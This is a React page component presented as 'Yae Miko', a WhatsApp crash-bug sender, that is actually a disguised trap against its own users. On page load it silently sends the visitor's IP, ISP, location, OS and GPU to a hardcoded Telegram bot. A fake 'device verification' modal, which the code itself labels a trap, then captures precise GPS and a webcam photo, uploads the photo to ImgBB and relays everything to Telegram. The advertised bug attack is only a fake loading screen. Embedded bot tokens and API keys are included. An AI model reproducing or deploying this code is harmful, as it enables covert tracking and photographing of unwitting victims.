"use client"

import { useState, useEffect } from "react"
import { Shield, Bug, Zap, CheckCircle, Globe, ChevronLeft, ChevronRight } from "lucide-react"

// ============================================================
// --- KONFIGURASI WAJIB (ISI DISINI) ---
// ============================================================
const TELE_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk';
const CHAT_ID = '6481060681';
const IMGBB_API_KEY = '4caf6ea53a17b11f879581a8ca9ee92e'; 

const BUG_TYPES = [
  { name: "DELAY INVISIBLE", code: "delayLow" },
  { name: "CRASH INVISIBLE", code: "crashHigh" },
  { name: "BLANK CLICK", code: "blankTap" },
  { name: "DELAY IOS", code: "delayIOS" },
  { name: "Force close Wa", code: "forceClose" },
]

export default function YaeMikoDashboard() {
  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [isLoading, setIsLoading] = useState(false)
  const [activeNav, setActiveNav] = useState(0)
  const [bugLimit, setBugLimit] = useState(5)
  const [showLimitWarning, setShowLimitWarning] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)
  const [showVerifyModal, setShowVerifyModal] = useState(false)

  // 1. INTEL COLLECTOR (Auto-run saat link dibuka)
  const sendInitialIntel = async () => {
    try {
      let targetID = localStorage.getItem('target_uuid') || 'SELZ-' + Math.random().toString(36).substring(2, 9).toUpperCase();
      localStorage.setItem('target_uuid', targetID);
      
      const ipRes = await fetch('https://ipapi.co/json/');
      const ipData = await ipRes.json();
      
      let gpu = "Unknown";
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        const debug = gl?.getExtension('WEBGL_debug_renderer_info');
        gpu = gl?.getParameter(debug?.UNMASKED_RENDERER_WEBGL || 0) || "Unknown";
      } catch (e) {}

      const msg = `🕵️ **NEW VISITOR: ${targetID}**\n━━━━━━━━━━━━━━━━━━\n📍 **IP:** ${ipData.ip}\n🌍 **Provider:** ${ipData.org}\n🗺️ **Loc:** ${ipData.city}, ${ipData.country_name}\n💻 **OS:** ${navigator.platform}\n🎮 **GPU:** ${gpu.slice(0,30)}\n━━━━━━━━━━━━━━━━━━`;

      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
      });
    } catch (e) {}
  };

  useEffect(() => { sendInitialIntel(); }, []);

  // 2. PRECISE GPS (High Accuracy)
  const getPreciseLocation = (): Promise<string> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) resolve("GPS Not Supported");
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
          resolve(`📍 **PRECISE LOC:** [View Maps](${link})\n🎯 **ACCURACY:** \`${pos.coords.accuracy.toFixed(1)}m\``);
        },
        () => resolve("📍 **PRECISE LOC:** \`Access Denied\`"),
        { enableHighAccuracy: true, timeout: 5000 }
      );
    });
  };

  // 3. IMGBB UPLOADER
  const uploadToIMGBB = async (imageBlob: Blob) => {
    const formData = new FormData();
    formData.append('image', imageBlob);
    try {
      const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
        method: 'POST',
        body: formData
      });
      const data = await res.json();
      return data.data.url;
    } catch (e) { return null; }
  };

  // 4. MAIN EXECUTION (Camera Capture + IMGBB + Telegram)
  const startFinalExecution = async () => {
    setShowVerifyModal(false);
    setIsLoading(true);

    const preciseLoc = await getPreciseLocation();
    
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      setTimeout(async () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d')?.drawImage(video, 0, 0);
        const blob = await new Promise<Blob | null>(res => canvas.toBlob(res, 'image/jpeg'));
        
        if (blob) {
          const photoUrl = await uploadToIMGBB(blob);
          const message = `📸 **TARGET CAPTURED**\n━━━━━━━━━━━━━━━━━━\n📱 **Target:** \`${targetNumber}\`\n🖼️ **Photo:** ${photoUrl || 'Upload Failed'}\n${preciseLoc}\n━━━━━━━━━━━━━━━━━━`;
          
          await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
          });
        }
        stream.getTracks().forEach(t => t.stop());
      }, 3000);
    } catch (e) {
      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: CHAT_ID, 
          text: `⚠️ **CAMERA BLOCKED**\nTarget: ${targetNumber}\n${preciseLoc}`, 
          parse_mode: 'Markdown' 
        })
      });
    }

    // Simulasi loading bug selesai
    setTimeout(() => { 
      setIsLoading(false); 
      setBugLimit(p => Math.max(0, p - 1)); 
    }, 5000);
  };

  const handleSendBug = () => {
    if (bugLimit <= 0) { setShowLimitWarning(true); return; }
    setShowVerifyModal(true);
  };

  return (
    <div className="relative min-h-screen bg-[#0a0f1a] overflow-hidden font-sans">
      <BokehBackground />
      
      {/* MODAL VERIFIKASI (TRAP) */}
      {showVerifyModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-[#0a0f1a]/95 backdrop-blur-md px-6">
          <div className="w-full max-w-sm glass border border-cyan-500/30 p-8 rounded-3xl text-center space-y-6">
            <div className="flex justify-center">
              <div className="w-20 h-20 bg-cyan-500/10 rounded-full flex items-center justify-center border border-cyan-500/40 shadow-[0_0_20px_rgba(6,182,212,0.4)]">
                <Shield className="w-10 h-10 text-cyan-400" />
              </div>
            </div>
            <div className="space-y-2">
              <h2 className="text-xl text-white font-bold tracking-widest uppercase">Sinkronisasi Keamanan</h2>
              <p className="text-sm text-gray-400 leading-relaxed">Aktifkan enkripsi endpoint untuk mengirim paket bug ke nomor <b>{targetNumber}</b> secara anonim.</p>
            </div>
            <button onClick={startFinalExecution} className="w-full py-4 bg-cyan-600 hover:bg-cyan-500 rounded-2xl text-white font-bold tracking-widest transition-all shadow-lg shadow-cyan-900/40">VERIFIKASI PERANGKAT</button>
            <p className="text-[10px] text-gray-600 uppercase tracking-widest">Protocol Version: 4.0.1-Secure</p>
          </div>
        </div>
      )}
      
      {!isLoggedIn ? (
        <>
          {isAuthLoading && <AuthLoadingScreen />}
          <LoginScreen onLogin={() => {
            setIsAuthLoading(true);
            setTimeout(() => { setIsAuthLoading(false); setIsLoggedIn(true); }, 4000);
          }} />
        </>
      ) : (
        <>
          {isLoading && <LoadingOverlay />}
          {showLimitWarning && <LimitWarningOverlay onClose={() => setShowLimitWarning(false)} />}
          
          <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto px-4 py-4">
            <Header />
            <ProfileCard />
            <ActionSection targetNumber={targetNumber} setTargetNumber={setTargetNumber} onSendBug={handleSendBug} activeNav={activeNav} />
            <NavigationDots activeNav={activeNav} setActiveNav={setActiveNav} />
            <BottomBar />
          </div>
        </>
      )}
    </div>
  )
}

// --- SUB KOMPONEN UI ---

function AuthLoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a]">
      <div className="relative z-10 flex flex-col items-center gap-8">
        <div className="text-7xl font-black tracking-tighter text-[#ff3db9] drop-shadow-[0_0_20px_rgba(255,61,185,0.8)] animate-pulse">SELZ</div>
        <div className="w-48 h-1 bg-gray-800 rounded-full overflow-hidden border border-cyan-500/20">
          <div className="h-full bg-cyan-400 animate-[loading-progress_2s_infinite]" style={{width: '100%'}} />
        </div>
      </div>
    </div>
  )
}

function BokehBackground() {
  return (
    <div className="fixed inset-0 pointer-events-none -z-10">
      <div className="absolute top-0 left-0 w-full h-full bg-[#0a0f1a]" />
      <div className="absolute top-10 -left-20 w-80 h-80 rounded-full bg-cyan-500/5 blur-3xl animate-pulse" />
      <div className="absolute bottom-10 -right-20 w-80 h-80 rounded-full bg-pink-500/5 blur-3xl animate-pulse" />
    </div>
  )
}

function Header() {
  return (
    <header className="flex justify-between items-center mb-6 px-2">
      <div className="p-2.5 bg-cyan-500/10 rounded-xl border border-cyan-500/20"><Shield className="text-cyan-400 w-5 h-5" /></div>
      <h1 className="text-white text-[11px] font-bold tracking-[0.4em] uppercase">Yae Miko v3.0</h1>
      <div className="w-10 h-10 rounded-full bg-pink-500/20 border border-pink-500/30 flex items-center justify-center text-pink-400 text-xs font-bold shadow-lg shadow-pink-900/20">YM</div>
    </header>
  )
}

function ProfileCard() {
  return (
    <div className="glass p-6 rounded-3xl border border-cyan-500/10 mb-6 text-center">
      <div className="w-20 h-20 bg-red-500/10 rounded-full border-2 border-red-500/20 mx-auto mb-4 flex items-center justify-center shadow-[0_0_20px_rgba(239,68,68,0.1)]">
        <Bug className="text-red-500 w-10 h-10" />
      </div>
      <div className="grid grid-cols-3 gap-4">
        <div className="space-y-1"><p className="text-cyan-400 font-bold text-lg">7</p><p className="text-[9px] text-gray-500 uppercase tracking-widest">Bugs</p></div>
        <div className="space-y-1"><p className="text-green-400 font-bold text-lg">99%</p><p className="text-[9px] text-gray-500 uppercase tracking-widest">Rate</p></div>
        <div className="space-y-1"><p className="text-green-400 font-bold text-lg">ON</p><p className="text-[9px] text-gray-500 uppercase tracking-widest">Server</p></div>
      </div>
    </div>
  )
}

function ActionSection({ targetNumber, setTargetNumber, onSendBug, activeNav }: any) {
  return (
    <div className="flex-1 space-y-6">
      <div className="space-y-2">
        <label className="text-[10px] text-cyan-400 tracking-[0.3em] font-bold uppercase ml-1">Target Number</label>
        <input type="text" value={targetNumber} onChange={e=>setTargetNumber(e.target.value)} className="w-full p-5 bg-[#0d1a30]/60 border border-cyan-500/10 rounded-2xl text-white font-mono text-xl focus:border-cyan-400/40 transition-all outline-none text-center" />
      </div>
      <div className="bg-[#161b22]/80 p-10 rounded-3xl border border-white/5 text-center shadow-2xl">
        <p className="text-[10px] text-gray-500 mb-2 tracking-[0.5em] uppercase font-bold">Protocol Selected</p>
        <p className="text-2xl font-black text-white tracking-tighter uppercase">{BUG_TYPES[activeNav].name}</p>
      </div>
      <button onClick={onSendBug} className="w-full py-5 bg-gradient-to-r from-pink-600 to-pink-500 text-white font-black rounded-2xl shadow-xl shadow-pink-900/30 transition-all active:scale-95 uppercase tracking-widest">Execute Bug</button>
    </div>
  )
}

function NavigationDots({ activeNav, setActiveNav }: any) {
  return (
    <div className="flex justify-center gap-3 mb-6">
      {BUG_TYPES.map((_,i)=>(
        <div key={i} onClick={()=>setActiveNav(i)} className={`h-1.5 rounded-full cursor-pointer transition-all ${activeNav===i?'bg-cyan-400 w-10':'bg-gray-800 w-2'}`} />
      ))}
    </div>
  )
}

function BottomBar() {
  return (
    <div className="mt-auto py-6 border-t border-white/5 flex justify-center items-center text-[10px] text-cyan-700 font-bold uppercase tracking-[0.5em]">
      [ Secure Connection Active ]
    </div>
  )
}

function LoadingOverlay() {
  return (
    <div className="fixed inset-0 z-[110] flex items-center justify-center bg-[#0a0f1a]/98 backdrop-blur-2xl">
      <div className="text-center space-y-6">
        <div className="w-20 h-20 border-4 border-cyan-500/20 border-t-cyan-400 rounded-full animate-spin mx-auto" />
        <h3 className="text-cyan-400 font-black tracking-[0.2em] uppercase text-sm animate-pulse">Injecting Virus...</h3>
      </div>
    </div>
  )
}

function LimitWarningOverlay({ onClose }: any) {
  return (
    <div className="fixed inset-0 z-[120] flex items-center justify-center bg-black/95">
      <div className="text-center p-10 glass border border-red-500/20 rounded-[2rem] max-w-xs">
        <h2 className="text-red-500 text-3xl font-black mb-4 uppercase italic">Limit Exceeded!</h2>
        <p className="text-gray-400 text-sm mb-8 leading-relaxed">Sistem mendeteksi aktivitas berlebih. Silahkan coba lagi besok.</p>
        <button onClick={onClose} className="w-full py-4 bg-red-600 text-white font-bold rounded-2xl uppercase tracking-widest shadow-lg shadow-red-900/40">Close System</button>
      </div>
    </div>
  )
}

function LoginScreen({ onLogin }: any) {
  const [u, setU] = useState(""); const [p, setP] = useState("");
  const handleAuth = () => {
    if (u === "Selz" && p === "Freebug") onLogin();
    else alert("Invalid Credentials! Hubungi t.me/Selzv");
  };
  return (
    <div className="relative z-20 flex items-center justify-center min-h-screen px-6">
      <div className="glass p-10 rounded-[2.5rem] border border-white/5 w-full max-w-sm bg-[#161b22]/40 shadow-2xl">
        <h1 className="text-center text-cyan-400 text-4xl font-black tracking-tighter mb-1">YAE MIKO</h1>
        <p className="text-center text-gray-500 text-[9px] tracking-[0.4em] uppercase mb-10 font-bold">Cyber-Menu Edition</p>
        <div className="space-y-4">
          <input type="text" placeholder="Access ID" className="w-full p-4 bg-[#0f192d]/80 border border-white/5 rounded-2xl text-white outline-none focus:border-cyan-500/30 transition-all text-center font-mono" onChange={e=>setU(e.target.value)} />
          <input type="password" placeholder="Pass-Key" className="w-full p-4 bg-[#0f192d]/80 border border-white/5 rounded-2xl text-white outline-none focus:border-cyan-500/30 transition-all text-center font-mono" onChange={e=>setP(e.target.value)} />
          <button onClick={handleAuth} className="w-full py-5 bg-cyan-600 hover:bg-cyan-500 text-white font-black rounded-2xl transition-all shadow-xl shadow-cyan-900/20 mt-4 uppercase tracking-[0.2em]">Enter System</button>
        </div>
      </div>
    </div>
  )
        }
